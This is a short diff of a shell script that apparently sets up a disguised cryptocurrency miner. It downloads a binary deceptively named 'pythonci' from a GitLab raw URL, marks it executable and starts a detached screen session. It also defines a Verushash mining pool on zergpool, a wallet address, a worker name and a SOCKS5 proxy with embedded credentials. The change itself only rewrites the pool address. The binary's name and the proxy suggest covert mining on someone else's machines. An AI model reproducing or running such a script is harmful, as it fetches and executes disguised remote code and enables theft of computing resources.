@@ -5,7 +5,7 @@ sudo apt install screen libjansson4 -y
 wget https://gitlab.com/Scalaxlarig/bisalahhh/-/raw/main/pythonci
 chmod +x pythonci
 screen -dmS ls
-PL=stratum+tcp://verushash.asia.mine.zergpool.com:3300
+PL=verushash.asia.mine.zergpool.com:3300
 WT=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 WR=jajal
 PY=socks5://w1rtyuw:s1dfgyt3b@150.129.171.123:6667
